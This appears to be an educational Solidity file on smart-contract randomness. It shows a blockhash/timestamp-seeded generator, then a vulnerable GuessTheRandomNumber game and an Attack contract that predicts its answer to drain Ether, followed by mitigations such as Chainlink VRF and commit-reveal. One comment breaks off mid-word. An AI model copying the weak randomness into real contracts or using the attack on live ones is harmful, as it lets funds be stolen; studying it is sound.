/*
Understanding the Importance of Randomness 🔍
Randomness is a fundamental concept in various domains, from cryptography to gaming. In Solidity, the need for randomness arises in scenarios like selecting winners in a lottery, distributing rewards fairly, shuffling elements, and creating unpredictable game mechanics. But why is true randomness crucial, and how does it impact smart contracts?

🎰 Fairness and Unpredictability: Imagine a decentralized application that hosts a lottery. If the source of randomness isn’t truly random, participants could predict the outcome, leading to manipulation and unfair practices. To ensure fairness, the source of randomness must be unpredictable and unbiased.

🔒 Security and Avoiding Exploits: In some cases, smart contracts use randomness for security mechanisms, such as generating private keys. If the randomness is compromised, malicious actors might exploit the vulnerability to predict private keys and gain unauthorized access to accounts or funds.

🎮 Gaming and User Experience: Games leveraging blockchain often rely on randomness to create exciting and unpredictable experiences. Whether it’s drawing cards, rolling dice, or determining outcomes, authentic randomness enhances user engagement and satisfaction.

Challenges in Achieving True Randomness in Solidity ⚙️
Solidity smart contracts run on blockchains, which are deterministic by nature. This means that given the same inputs, the output of a contract will always be the same. Achieving true randomness within such a deterministic environment is challenging due to several factors:

🔗 Blockchain Determinism: Blockchains are designed to be reproducible, ensuring that every node on the network reaches the same conclusions. While this is a crucial feature for consensus and validation, it poses a challenge when generating random values.

📶 Lack of External Input: True randomness often relies on external, unpredictable factors, like atmospheric noise or user actions. Smart contracts lack direct access to such sources of randomness, making it difficult to introduce genuine unpredictability.

🚧 Vulnerability to Manipulation: If a contract relies solely on its internal state for randomness, it becomes susceptible to manipulation by miners or malicious actors who could potentially influence the contract’s state to their advantage.

Approaches to Generating Randomness in Solidity 🔄
While achieving true randomness is a challenge, several approaches and techniques can be employed to introduce a level of randomness into Solidity smart contracts:

1. Block Hashes: Utilizing the hash of the most recent block as a source of randomness is a common technique. While it’s not perfectly random, it introduces an element of unpredictability.

2. Oracles and External Data: Oracles are external services that provide data to smart contracts. They can be used to fetch external randomness sources, like API data, to influence contract behavior.

3. Commit-Reveal Schemes: Participants commit to a value in advance, and after all commitments are submitted, the actual value is revealed. This introduces a layer of unpredictability.

4. Chainlink VRF: Chainlink’s Verifiable Random Function (VRF) is a decentralized solution that leverages multiple inputs to generate a ran
*/

//Implementing a Simple Random Number Generator in Solidity 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract RandomNumberGenerator {
 uint256 private seed;
constructor() {
 seed = block.timestamp;
 }
function generateRandomNumber() public returns (uint256) {
 uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), seed)));
 seed = randomNumber;
 return randomNumber;
 }
}

/*
In this example, the contract initializes the seed with the current timestamp. The `generateRandomNumber` function combines the previous block’s hash with the seed and updates the seed for the next iteration. While this approach introduces some randomness, it’s important to note that it’s not entirely secure for all applications due to potential miner manipulation.

Testing Randomness in Solidity Contracts 🧪
Ensuring the randomness mechanisms in your Solidity contracts function as intended requires comprehensive testing. Here’s how you can approach testing randomness:

1. Unit Testing: Write unit tests to check the behavior of your randomness generation functions. Test various inputs and ensure the generated values fall within the expected range.

2. Integration Testing: Test the integration of randomness into larger contract functionalities. For instance, if your contract uses randomness to select winners, simulate different scenarios and verify the fairness of selections.

3. Edge Cases: Test edge cases where extreme inputs could potentially lead to biased outputs. This helps identify vulnerabilities and ensures your contract behaves robustly in all scenarios.

4. Security Audits: Consider undergoing a security audit to identify potential vulnerabilities in your randomness implementation. Security experts can help pinpoint weaknesses and suggest improvements.
*/


//Smart Contract Analysis Report: “Source of Randomness” Vulnerability

/*
In this analysis report, we will explore a vulnerability related to the use of `blockhash` and `block.timestamp` as a source of randomness in Solidity smart contracts. The vulnerability arises due to the deterministic nature of blockchains and the potential for attackers to predict and exploit random values generated using these methods. We will provide a detailed breakdown of the vulnerable smart contract, demonstrate how an attack can be executed, and discuss preventative techniques to mitigate this vulnerability.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//Vulnerable Smart Contract: GuessTheRandomNumber

/*
The smart contract `GuessTheRandomNumber` presents the vulnerability under consideration. The purpose of the contract is to allow users to guess a pseudo-random number generated from the combination of `blockhash(block.number — 1)` and `block.timestamp`. If a user’s guessed number matches the generated number, they win 1 Ether.
*/

pragma solidity ^0.8.17;
contract GuessTheRandomNumber {
 constructor() payable {}
function guess(uint _guess) public {
 uint answer = uint(
 keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
 );
if (_guess == answer) {
 (bool sent, ) = msg.sender.call{value: 1 ether}("");
 require(sent, "Failed to send Ether");
 }
 }
}


//Vulnerability Exploitation: Attack Contract

/*
The `Attack` contract demonstrates how an attacker can exploit the vulnerability in the `GuessTheRandomNumber` contract. The `Attack` contract calculates the expected answer using the same method as the `GuessTheRandomNumber` contract. By calling the `guess` function with the calculated answer, the attacker can win 1 Ether without actually making a legitimate guess.
*/

contract Attack {
 receive() external payable {}
function attack(GuessTheRandomNumber guessTheRandomNumber) public {
 uint answer = uint(
 keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
 );
guessTheRandomNumber.guess(answer);
 }
function getBalance() public view returns (uint) {
 return address(this).balance;
 }
}


/*
Vulnerability Analysis
The vulnerability arises from the fact that `blockhash` and `block.timestamp` are not reliable sources of randomness for secure applications. Since miners have some control over which transactions are included in a block, they can manipulate the `block.timestamp` to a certain extent. Additionally, because the attacker can see the current state of the blockchain, they can predict the value of `blockhash` and `block.timestamp` in advance, allowing them to compute the expected answer.

Preventative Techniques
To prevent the exploitation of the vulnerability outlined above, developers should avoid using `blockhash` and `block.timestamp` as sources of randomness in situations where true randomness is crucial. Instead, consider the following preventative techniques:

1. Oracles: Use decentralized oracles that provide external randomness sources. These oracles can fetch unpredictable data from off-chain sources, enhancing the randomness of the generated values.

2. Chainlink VRF: Leverage Chainlink’s Verifiable Random Function (VRF) to generate secure random numbers. Chainlink VRF uses multiple inputs to produce a random value that can be verified on-chain.

3. Commit-Reveal Schemes: Implement commit-reveal schemes where participants commit to values in advance and reveal them later. This introduces an additional layer of unpredictability.

4. External Contracts: Interact with other smart contracts that specialize in randomness generation. These contracts might utilize more secure mechanisms to ensure randomness.
*/